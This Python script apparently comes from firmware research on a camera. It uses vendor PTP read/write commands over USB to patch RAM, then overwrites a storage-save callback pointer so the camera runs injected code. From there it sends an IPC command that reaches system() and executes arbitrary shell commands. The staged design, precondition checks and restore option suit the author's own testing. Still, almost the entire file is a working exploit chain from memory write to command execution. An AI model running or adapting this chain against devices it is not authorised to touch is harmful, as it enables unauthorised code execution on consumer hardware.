#!/usr/bin/env python3
"""Live BF RAM-patch stages over vendor PTP (0x900a write / 0x900b read).

Measured live layout (2026-11-05, camera firmware 1.04):
  base global [0x4d7301a00] = 0x400d10c00
  read buffer cache slot     0x4d72c2230 -> heap buffer, 0x10080 bytes
  storage write callback     0x4d729bd00, original 0x4d31254f0
  every 0x900a write runs the calibration save, which calls that callback
  RTOS->Linux IPC sender     0x4d31dd0f0 (selector 1 -> system())

Stages (each is explicit, no automatic escalation):
  scratch : write 8 magic bytes into the heap read buffer and read them back.
            No code executes.  Proves the write primitive and address math.
  marker  : write a payload that restores the callback and stores a marker,
            then point the callback at it.  Proves same-mode code execution.
  ipc     : same payload shape, but sends an IPC selector-1 command instead of
            the marker.  The command's effect is checked afterwards.

Safety:
  - Only RAM is written.  The flash save still runs (as it does for any
    SetAdjustValue) but the calibration block itself is never targeted.
  - The tool refuses to write unless the callback slot currently holds the
    recorded original value.
  - Recovery: power-cycle restores the callback slot; or re-run --restore.

Usage:
  live_stage.py --stage scratch
  live_stage.py --stage marker
  live_stage.py --stage ipc --command "date > /media/root/SIGMA/bf-ram-ok"
  live_stage.py --restore
"""

import argparse
import json
import struct
import time

import usb.core
import usb.util

import build_live_payload as blp

VID = 0x1003
PID = 0xC462
CONTAINER = struct.Struct("<IHHI")
TYPE_COMMAND = 1
TYPE_DATA = 2
TYPE_RESPONSE = 3
CODE_OPEN_SESSION = 0x1002
CODE_GET_ADJUST = 0x900B
CODE_SET_ADJUST = 0x900A

BASE = 0x400D10C00
CACHE_SLOT = 0x4D72C2230
CALLBACK_SLOT = 0x4D729BD00
ORIGINAL_CALLBACK = 0x4D31254F0
SENDER = 0x4D31DD0F0

PAYLOAD_OFF = 0x8000      # inside the 0x10080 read buffer
MARKER_OFF = 0x9000
MARKER_VALUE = 0x42464D41524B0001


def endpoints(intf):
    out = inp = None
    for ep in intf:
        attr = ep.bmAttributes & 3
        direction = usb.util.endpoint_direction(ep.bEndpointAddress)
        if attr == usb.util.ENDPOINT_TYPE_BULK and direction == usb.util.ENDPOINT_OUT:
            out = ep
        elif attr == usb.util.ENDPOINT_TYPE_BULK and direction == usb.util.ENDPOINT_IN:
            inp = ep
    return out, inp


def read_container(dev, ep, timeout=8000):
    buf = b""
    length = None
    while True:
        buf += bytes(dev.read(ep.bEndpointAddress, 0x10000, timeout=timeout))
        if length is None and len(buf) >= 12:
            length = struct.unpack_from("<I", buf, 0)[0]
        if length is not None and len(buf) >= length:
            return buf[:length]


def collect(dev, in_ep, expect_tid, timeout=8000):
    data = None
    status = None
    for _ in range(8):
        raw = read_container(dev, in_ep, timeout=timeout)
        _, ctype, code, tid = CONTAINER.unpack_from(raw, 0)
        if ctype == TYPE_DATA:
            data = raw[12:]
        if ctype == TYPE_RESPONSE:
            status = code
            break
    return status, data


def ptp_read(dev, out_ep, in_ep, addr, length, tid):
    dev.write(
        out_ep.bEndpointAddress,
        CONTAINER.pack(20, TYPE_COMMAND, CODE_GET_ADJUST, tid)
        + struct.pack("<II", (addr - BASE) & 0xFFFFFFFF, length),
        timeout=8000,
    )
    status, data = collect(dev, in_ep, tid)
    return status, data


def ptp_write(dev, out_ep, in_ep, addr, payload, tid):
    dev.write(
        out_ep.bEndpointAddress,
        CONTAINER.pack(20, TYPE_COMMAND, CODE_SET_ADJUST, tid)
        + struct.pack("<II", (addr - BASE) & 0xFFFFFFFF, len(payload)),
        timeout=8000,
    )
    dev.write(
        out_ep.bEndpointAddress,
        CONTAINER.pack(12 + len(payload), TYPE_DATA, CODE_SET_ADJUST, tid) + payload,
        timeout=15000,
    )
    status, _ = collect(dev, in_ep, tid, timeout=30000)
    return status


def qword(data):
    return struct.unpack_from("<Q", data, 0)[0] if data and len(data) >= 8 else None


def run(stage, command):
    dev = usb.core.find(idVendor=VID, idProduct=PID)
    if dev is None:
        return {"error": "device not found"}
    out = {"stage": stage, "read_only": False, "base": hex(BASE)}
    intf = None
    try:
        cfg = dev.get_active_configuration()
        intf = cfg[(0, 0)]
        out_ep, in_ep = endpoints(intf)
        try:
            usb.util.claim_interface(dev, intf.bInterfaceNumber)
        except usb.core.USBError as exc:
            return {"error": "claim failed", "detail": str(exc)}
        for ep in (out_ep, in_ep):
            try:
                dev.clear_halt(ep.bEndpointAddress)
            except usb.core.USBError:
                pass
        dev.write(
            out_ep.bEndpointAddress,
            CONTAINER.pack(16, TYPE_COMMAND, CODE_OPEN_SESSION, 0xE1) + struct.pack("<I", 1),
            timeout=8000,
        )
        try:
            read_container(dev, in_ep)
        except usb.core.USBError:
            pass

        # preconditions
        st, data = ptp_read(dev, out_ep, in_ep, CACHE_SLOT, 8, 0xE2)
        buf = qword(data)
        out["read_buffer"] = hex(buf) if buf else None
        st, data = ptp_read(dev, out_ep, in_ep, CALLBACK_SLOT, 8, 0xE3)
        cur = qword(data)
        out["callback_before"] = hex(cur) if cur else None
        if cur != ORIGINAL_CALLBACK:
            out["error"] = "callback slot is not the recorded original; refusing to write"
            return out

        payload_addr = buf + PAYLOAD_OFF
        marker_addr = buf + MARKER_OFF
        out["payload_addr"] = hex(payload_addr)

        if stage == "scratch":
            magic = MARKER_VALUE
            out["scratch_addr"] = hex(payload_addr)
            st, data = ptp_read(dev, out_ep, in_ep, payload_addr, 8, 0xE4)
            out["before"] = data.hex() if data else None
            status = ptp_write(dev, out_ep, in_ep, payload_addr,
                               struct.pack("<Q", magic), 0xE5)
            out["write_status"] = hex(status) if status is not None else None
            st, data = ptp_read(dev, out_ep, in_ep, payload_addr, 8, 0xE6)
            out["after"] = data.hex() if data else None
            out["ok"] = data == struct.pack("<Q", magic)
            return out

        built = blp.build(stage, payload_addr, command=command,
                          marker_addr=marker_addr, marker_value=MARKER_VALUE,
                          sender=SENDER)
        blob = bytes.fromhex(built["blob_hex"])
        if len(blob) + PAYLOAD_OFF > 0x10080:
            out["error"] = "payload does not fit in the read buffer"
            return out

        # read buffer state is not required to be zero; record it
        st, pre = ptp_read(dev, out_ep, in_ep, payload_addr, min(len(blob), 16), 0xE7)
        out["preview_before"] = pre.hex() if pre else None

        status = ptp_write(dev, out_ep, in_ep, payload_addr, blob, 0xE8)
        out["payload_write_status"] = hex(status) if status is not None else None
        if status != 0x2001:
            out["error"] = "payload write rejected"
            return out
        # The worker completes the memcpy shortly after the response, and a
        # write issued during a previous save can be dropped, so rewrite.
        back = None
        for attempt in range(8):
            for _ in range(8):
                time.sleep(0.3)
                st, back = ptp_read(dev, out_ep, in_ep, payload_addr, len(blob), 0xE9)
                if back == blob:
                    break
            if back == blob:
                out["payload_readback_attempts"] = attempt + 1
                break
            time.sleep(1.0)
            ptp_write(dev, out_ep, in_ep, payload_addr, blob, 0xE8)
        out["payload_readback_ok"] = back == blob
        if back != blob:
            out["error"] = "payload readback mismatch"
            out["payload_readback_hex"] = back.hex() if back else None
            return out

        # trigger: the save that follows this very write calls the callback
        status = ptp_write(dev, out_ep, in_ep, CALLBACK_SLOT,
                           struct.pack("<Q", payload_addr), 0xEA)
        out["trigger_status"] = hex(status) if status is not None else None

        # The save that calls the payload runs asynchronously after the
        # response, so give it a moment before verifying.
        time.sleep(2.0)

        st, data = ptp_read(dev, out_ep, in_ep, CALLBACK_SLOT, 8, 0xEB)
        out["callback_after"] = hex(qword(data)) if data else None
        out["callback_restored"] = qword(data) == ORIGINAL_CALLBACK

        if stage == "marker":
            st, data = ptp_read(dev, out_ep, in_ep, marker_addr, 8, 0xEC)
            out["marker"] = hex(qword(data)) if data else None
            out["executed"] = qword(data) == MARKER_VALUE
        return out
    finally:
        if intf is not None:
            try:
                usb.util.release_interface(dev, intf.bInterfaceNumber)
            except usb.core.USBError:
                pass
        try:
            usb.util.dispose_resources(dev)
        except Exception:
            pass


def restore():
    dev = usb.core.find(idVendor=VID, idProduct=PID)
    if dev is None:
        return {"error": "device not found"}
    out = {"stage": "restore"}
    intf = None
    try:
        cfg = dev.get_active_configuration()
        intf = cfg[(0, 0)]
        out_ep, in_ep = endpoints(intf)
        usb.util.claim_interface(dev, intf.bInterfaceNumber)
        for ep in (out_ep, in_ep):
            try:
                dev.clear_halt(ep.bEndpointAddress)
            except usb.core.USBError:
                pass
        dev.write(
            out_ep.bEndpointAddress,
            CONTAINER.pack(16, TYPE_COMMAND, CODE_OPEN_SESSION, 0xF1) + struct.pack("<I", 1),
            timeout=8000,
        )
        try:
            read_container(dev, in_ep)
        except usb.core.USBError:
            pass
        status = ptp_write(dev, out_ep, in_ep, CALLBACK_SLOT,
                           struct.pack("<Q", ORIGINAL_CALLBACK), 0xF2)
        out["write_status"] = hex(status) if status is not None else None
        st, data = ptp_read(dev, out_ep, in_ep, CALLBACK_SLOT, 8, 0xF3)
        out["callback"] = hex(qword(data)) if data else None
        out["ok"] = qword(data) == ORIGINAL_CALLBACK
        return out
    finally:
        if intf is not None:
            try:
                usb.util.release_interface(dev, intf.bInterfaceNumber)
            except usb.core.USBError:
                pass
        try:
            usb.util.dispose_resources(dev)
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--stage", choices=("scratch", "marker", "ipc"))
    ap.add_argument("--command", default="echo bf-ram-ok > /media/root/SIGMA/bf-ram-ok")
    ap.add_argument("--restore", action="store_true")
    args = ap.parse_args()
    if args.restore:
        print(json.dumps(restore(), indent=2))
    elif args.stage:
        print(json.dumps(run(args.stage, args.command), indent=2))
    else:
        ap.error("--stage or --restore required")


if __name__ == "__main__":
    main()
